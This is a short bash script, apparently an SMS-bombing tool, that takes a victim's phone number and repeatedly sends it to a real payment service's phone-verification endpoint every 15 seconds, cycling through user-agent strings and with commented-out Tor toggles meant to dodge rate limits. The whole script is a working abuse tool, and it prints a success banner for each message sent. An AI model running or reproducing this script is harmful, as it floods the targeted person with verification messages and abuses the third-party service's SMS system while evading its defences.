#!/bin/bash
curl -s --http2 -X POST -A "$(sed -n 1000p user-agents.txt)$$" -H "accept:application/json, text/plain, */*" -H "authorization:undefined" -H "save-data:on" -H "content-type:application/json;charset=UTF-8" -d '{"phone_number":"'"$1"'"}' "https://service.mokapos.com/account/v1/verification/phone/send" > .send
total=$(cat user-agents.txt |wc -l)
#sv-disable tor
for user_line in `seq 1 $total`;do
	sleep 15
	echo
	#sv up tor
	curl -s --http2 -X POST -A "$(sed -n $user_line\p user-agents.txt)$$" -H "accept:application/json, text/plain, */*" -H "authorization:undefined" -H "save-data:on" -H "content-type:application/json;charset=UTF-8" -d '{"phone_number":"'"$1"'"}' "https://service.mokapos.com/account/v1/verification/phone/send" > .send
	control=$(cat .send |grep -o '"request_id":null')
	if [[ ! -n $control ]];then
		echo
		echo
		echo
		printf "\e[1;32m[✓]\e[32m +-+-+-+-+-+-+-+-+-+->> \e[97mSenDinNG"
		echo
		echo
		echo
	fi
	rm .send
	#sv-disable tor
done
exit
